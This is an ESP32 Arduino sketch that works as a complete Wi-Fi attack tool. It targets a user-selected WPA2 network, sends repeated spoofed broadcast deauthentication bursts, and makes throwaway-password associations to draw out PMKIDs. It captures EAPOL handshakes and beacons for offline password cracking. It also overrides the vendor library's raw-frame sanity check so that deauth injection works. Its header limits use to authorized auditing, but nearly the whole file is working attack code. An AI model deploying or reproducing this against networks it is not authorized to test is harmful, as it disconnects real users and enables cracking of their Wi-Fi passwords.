/*
 * ESP32 WPA2 deauth + PMKID/handshake capture tool - FOR AUDITING NETWORKS
 * YOU OWN OR ARE EXPLICITLY AUTHORIZED TO TEST ONLY.
 *
 * Flow:
 *  1. Scan for nearby networks and print a numbered list over Serial.
 *  2. Wait for you to type the number of the network to target.
 *  3. Lock onto that network's channel + BSSID, start promiscuous capture
 *     filtered to that BSSID, watching for EAPOL frames.
 *  4. Continuously, on independent schedules, until reset/reflashed:
 *       a. Every 2s, send a deauth burst (spoofed as the AP) to broadcast,
 *          which disconnects real connected clients and makes them
 *          reconnect, producing a genuine 4-way handshake. Same cadence
 *          as the proven-working deauth_only.ino.
 *       b. Every 15s, also attempt to associate to the AP ourselves
 *          (throwaway password) - the AP replies with EAPOL message 1
 *          before ever checking the password, and on routers that support
 *          PMKID caching that message carries a PMKID crackable the same
 *          way. Capturing a frame doesn't stop either loop, since it might
 *          just be our own attempt rather than a real client's handshake.
 *  5. Every EAPOL frame seen is dumped to Serial as a hex line prefixed
 *     "EAPOL:", and the first Beacon frame as "BEACON:" (hcxpcapngtool
 *     needs it to learn the SSID). A companion Python script on the host
 *     reconstructs a real .pcap file from these lines for offline
 *     analysis with hashcat / hcxtools.
 *
 * Deauth-frame injection note: Espressif's closed-source WiFi library
 * blocks raw deauth/disassoc frames sent via esp_wifi_80211_tx on the
 * STA interface ("unsupport frame type: 0c0"). This works around that
 * the same way the ESP32Marauder project does: (1) define our own
 * ieee80211_raw_frame_sanity_check() - since libnet80211.a is a static
 * archive, the linker prefers this application-supplied definition over
 * the restrictive one bundled in the library, so the internal check
 * always passes; (2) transmit via WIFI_IF_AP instead of WIFI_IF_STA,
 * since the block is specifically on the STA-side raw-injection path.
 *
 * Only select a network and clients you own or are explicitly authorized
 * to test. Sending deauth frames disconnects real, currently connected
 * devices, even if only briefly.
 */

#include <WiFi.h>
#include <esp_wifi.h>

// See explanation above: overrides the library's restrictive version so
// esp_wifi_80211_tx() stops rejecting deauth/disassoc frames.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
  return 0;
}

#define DEAUTH_INTERVAL_MS 2000   // matches deauth_only.ino's proven-working cadence
#define PMKID_INTERVAL_MS 15000   // association attempts are supplementary, stay slower
#define DEAUTH_BURST_COUNT 10
#define MAX_NETWORKS 40
#define DUMMY_PASSWORD "00000000"      // throwaway - AP sends EAPOL M1 before validating this

static uint8_t targetBSSID[6];
static int targetChannel = 0;
static String targetSSID;
static bool haveTarget = false;
static int eapolCount = 0;
static unsigned long lastDeauthMs = 0;
static unsigned long lastPmkidMs = 0;
static bool attackRunning = true;

// Standard 802.11 deauth frame, source+BSSID spoofed as the AP, dest = broadcast.
static uint8_t deauthFrame[26] = {
  0xC0, 0x00,                         // Frame Control: type=mgmt, subtype=deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1: destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: source (AP BSSID, filled at runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (filled at runtime)
  0x00, 0x00,                         // Sequence control
  0x07, 0x00                          // Reason code: Class 3 frame from nonassociated STA
};

bool macMatches(const uint8_t *mac) {
  return memcmp(mac, targetBSSID, 6) == 0;
}

void sendDeauthBurst() {
  memcpy(&deauthFrame[10], targetBSSID, 6);
  memcpy(&deauthFrame[16], targetBSSID, 6);
  for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delay(20);
  }
  lastDeauthMs = millis();
  Serial.printf("STATUS: deauth burst sent (%d frames) to broadcast, spoofed AP %02X:%02X:%02X:%02X:%02X:%02X\n",
    DEAUTH_BURST_COUNT,
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
}

void triggerAssociationAttempt() {
  Serial.printf("STATUS: attempting association to \"%s\" (throwaway password) to prompt EAPOL M1/PMKID...\n",
    targetSSID.c_str());
  WiFi.disconnect();
  delay(50);
  WiFi.begin(targetSSID.c_str(), DUMMY_PASSWORD, targetChannel, targetBSSID, true);
  lastPmkidMs = millis();
}

// Detect EAPOL (WPA handshake) frames: 802.11 data frame carrying an
// LLC/SNAP header with EtherType 0x888E (EAPOL).
bool isEapolFrame(uint8_t *payload, uint16_t len, uint16_t *llcOffset) {
  uint8_t frameType = (payload[0] >> 2) & 0x3;
  if (frameType != 2) return false; // not a data frame

  uint8_t subtype = (payload[0] >> 4) & 0xF;
  bool qos = (subtype & 0x08) != 0;
  uint8_t fc1 = payload[1];
  bool toDS = fc1 & 0x1;
  bool fromDS = (fc1 >> 1) & 0x1;

  uint16_t hdrLen = 24; // base 802.11 header
  if (toDS && fromDS) hdrLen += 6; // 4-address frame
  if (qos) hdrLen += 2;

  if (len < hdrLen + 8) return false;

  uint8_t *llc = payload + hdrLen;
  // LLC/SNAP: AA AA 03 00 00 00 <ethertype 2 bytes>
  if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
      llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
      llc[6] == 0x88 && llc[7] == 0x8E) {
    *llcOffset = hdrLen;
    return true;
  }
  return false;
}

static bool beaconCaptured = false;

void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  uint8_t *addr1 = payload + 4;
  uint8_t *addr2 = payload + 10;
  uint8_t *addr3 = payload + 16;

  if (!haveTarget) return;
  if (!macMatches(addr1) && !macMatches(addr2) && !macMatches(addr3)) return;

  // hcxpcapngtool needs a Beacon/ProbeResponse frame in the capture to
  // learn the SSID (required to compute the PMK) - forward the first one
  // we see from the target BSSID, once.
  uint8_t frameType = (payload[0] >> 2) & 0x3;
  uint8_t frameSubtype = (payload[0] >> 4) & 0xF;
  if (!beaconCaptured && frameType == 0 && (frameSubtype == 8 || frameSubtype == 5)) {
    beaconCaptured = true;
    Serial.print("BEACON:");
    for (uint16_t i = 0; i < len; i++) {
      if (payload[i] < 0x10) Serial.print('0');
      Serial.print(payload[i], HEX);
    }
    Serial.println();
  }

  uint16_t llcOffset;
  if (!isEapolFrame(payload, len, &llcOffset)) return;

  eapolCount++;
  Serial.printf("EAPOL_META: #%d rssi=%d len=%d\n", eapolCount, pkt->rx_ctrl.rssi, len);
  Serial.print("EAPOL:");
  for (uint16_t i = 0; i < len; i++) {
    if (payload[i] < 0x10) Serial.print('0');
    Serial.print(payload[i], HEX);
  }
  Serial.println();
}

const char *authModeStr(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
    case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2-PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3-PSK";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3-PSK";
    default: return "UNKNOWN";
  }
}

// Reads one line from Serial, blocking until Enter is pressed.
String readSerialLine() {
  String line = "";
  while (true) {
    if (Serial.available()) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        if (line.length() > 0) return line;
      } else {
        line += c;
      }
    }
    delay(10);
  }
}

// Scans nearby networks, prints a numbered list, and blocks until the user
// picks one by typing its number (or 'r' to rescan) over Serial.
bool selectTargetNetworkInteractive() {
  int n;
  while (true) {
    Serial.println("\nScanning for nearby networks...");
    n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
      Serial.println("No networks found. Rescanning in 3s...");
      delay(3000);
      continue;
    }
    if (n > MAX_NETWORKS) n = MAX_NETWORKS;

    Serial.println("\n#   SSID                             CH  RSSI  ENC            BSSID");
    for (int i = 0; i < n; i++) {
      uint8_t *bssid = WiFi.BSSID(i);
      Serial.printf("%-3d %-32s %-3d %-5d %-14s %02X:%02X:%02X:%02X:%02X:%02X\n",
        i + 1,
        WiFi.SSID(i).c_str(),
        WiFi.channel(i),
        WiFi.RSSI(i),
        authModeStr(WiFi.encryptionType(i)),
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    }
    Serial.println("\nType the number of the network to target, or 'r' to rescan:");

    String choice = readSerialLine();
    choice.trim();
    if (choice.equalsIgnoreCase("r")) continue;

    int idx = choice.toInt();
    if (idx < 1 || idx > n) {
      Serial.println("Invalid selection, try again.");
      continue;
    }

    idx -= 1;
    targetSSID = WiFi.SSID(idx);
    targetChannel = WiFi.channel(idx);
    memcpy(targetBSSID, WiFi.BSSID(idx), 6);
    Serial.printf("\nTargeting \"%s\" on channel %d, BSSID %02X:%02X:%02X:%02X:%02X:%02X, RSSI %d\n",
      targetSSID.c_str(), targetChannel,
      targetBSSID[0], targetBSSID[1], targetBSSID[2],
      targetBSSID[3], targetBSSID[4], targetBSSID[5],
      WiFi.RSSI(idx));
    return true;
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // AP_STA (not just STA) is required so WIFI_IF_AP is a valid, started
  // interface for the deauth raw-frame transmission below.
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  delay(100);

  haveTarget = selectTargetNetworkInteractive();

  esp_wifi_set_promiscuous(true);
  wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  Serial.printf("Locked to channel %d for \"%s\". Starting continuous deauth + association attempts - reflash or reset to stop.\n", targetChannel, targetSSID.c_str());
  delay(500);
  sendDeauthBurst();
  triggerAssociationAttempt();
}

// Non-blocking check for a command sent from the host GUI/script while the
// main loop is running (unlike readSerialLine(), used only during the
// initial network pick, this never blocks). "STOP" pauses the deauth burst
// and PMKID association attempts and switches off promiscuous capture,
// without resetting the board or losing the current serial session - use a
// hardware reset (DTR/RTS pulse from the host) to start over from scratch.
void checkSerialCommands() {
  if (!Serial.available()) return;
  String cmd = Serial.readStringUntil('\n');
  cmd.trim();
  if (cmd.equalsIgnoreCase("STOP")) {
    attackRunning = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("STATUS: stopped - deauth attack and packet capture halted. Reset the board to start over.");
  }
}

void loop() {
  checkSerialCommands();
  if (!attackRunning) {
    delay(50);
    return;
  }

  // Both run continuously and independently, same as the proven-working
  // deauth_only.ino cadence - capturing EAPOL frames doesn't stop either,
  // since a single frame may just be our own PMKID-trigger attempt rather
  // than a real client's handshake. Stop by sending "STOP" or
  // resetting/reflashing the board.
  if (millis() - lastDeauthMs > DEAUTH_INTERVAL_MS) {
    sendDeauthBurst();
  }
  if (millis() - lastPmkidMs > PMKID_INTERVAL_MS) {
    triggerAssociationAttempt();
  }
  delay(50);
}
